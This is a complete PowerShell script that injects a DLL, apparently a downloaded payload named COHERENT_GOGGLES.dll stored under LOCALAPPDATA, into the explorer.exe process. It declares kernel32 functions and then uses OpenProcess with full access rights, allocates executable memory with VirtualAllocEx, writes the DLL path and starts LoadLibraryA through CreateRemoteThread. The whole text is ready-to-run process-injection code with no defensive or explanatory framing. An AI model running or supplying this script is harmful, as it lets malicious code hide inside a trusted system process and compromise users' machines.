# Define the path to the downloaded DLL
$path = "$env:LOCALAPPDATA\DownloadedFolder\COHERENT_GOGGLES.dll"

# Get the process ID of explorer.exe
$explorerProcess = Get-Process explorer | Select-Object -First 1
$explorerPid = $explorerProcess.Id  # Renamed variable to avoid conflict with $PID

# Define the necessary Windows API functions for DLL injection
$signature = @"
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CloseHandle(IntPtr hObject);
"@

# Add the functions to the script
Add-Type -MemberDefinition $signature -Namespace "WinAPI" -Name "DllInjection"

# Open the target process with necessary permissions
$processHandle = [WinAPI.DllInjection]::OpenProcess(0x001F0FFF, $false, $explorerPid)

if ($processHandle -eq [IntPtr]::Zero) {
    Write-Error "Failed to open process. Exiting."
    exit
}

# Get the address of LoadLibraryA in kernel32.dll
$loadLibraryAddr = [WinAPI.DllInjection]::GetProcAddress([WinAPI.DllInjection]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")

# Allocate memory in the target process for the DLL path
$remoteMemory = [WinAPI.DllInjection]::VirtualAllocEx($processHandle, [IntPtr]::Zero, [uint32]([System.Text.Encoding]::ASCII.GetByteCount($path) + 1), 0x3000, 0x40)

# Write the DLL path into the allocated memory
$bytes = [System.Text.Encoding]::ASCII.GetBytes($path)
[WinAPI.DllInjection]::WriteProcessMemory($processHandle, $remoteMemory, $bytes, [uint32]$bytes.Length, [ref]([UIntPtr]::Zero))

# Create a remote thread to execute LoadLibraryA with the DLL path
$remoteThread = [WinAPI.DllInjection]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $loadLibraryAddr, $remoteMemory, 0, [IntPtr]::Zero)

if ($remoteThread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread. Exiting."
} else {
    Write-Host "DLL injected successfully into explorer.exe."
}

# Clean up handles
[WinAPI.DllInjection]::CloseHandle($remoteThread)
[WinAPI.DllInjection]::CloseHandle($processHandle)
